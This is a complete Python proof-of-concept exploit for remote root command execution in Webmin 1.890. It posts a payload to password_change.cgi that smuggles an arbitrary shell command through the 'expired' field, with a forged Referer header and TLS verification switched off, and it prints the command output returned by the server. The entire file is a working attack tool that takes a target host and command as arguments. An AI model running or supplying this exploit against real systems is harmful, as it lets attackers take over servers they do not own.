import requests,argparse,os
from bs4 import BeautifulSoup
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

parser = argparse.ArgumentParser(description='Webmin 1.890 expired Remote Root POC',
                                epilog=f'python3 {os.path.basename(__file__)} -host target -port 10000 -cmd id')
parser.add_argument("-host", help='Host to attack', required=True, metavar='IP')
parser.add_argument("-port", help='Port of the host ~ 10000 is Default', metavar='Port', default="10000")
parser.add_argument("-cmd", help='Command to execute ~ id is Default', metavar='Command', default='id')
args = parser.parse_args()

#Exploit
def exploit(host,port,cmd,url):
    header = {'Referer': 'http://{}:{}/session_login.cgi'.format(host,port)}
    payload = 'user=gotroot&pam=&expired=2|echo "";{}'.format(cmd)
    print('Fetch url : ', url)
    request = requests.post(url, data=payload, headers=header, verify=False)
    soup = BeautifulSoup(request.content, 'html.parser')
    print(soup.find_all("p")[0].get_text())


if __name__ == "__main__":
    try:
        url = "http://{}:{}/password_change.cgi".format(args.host,args.port)
        exploit(args.host,args.port,args.cmd,url)
    except KeyboardInterrupt:
        print("\nBye...")
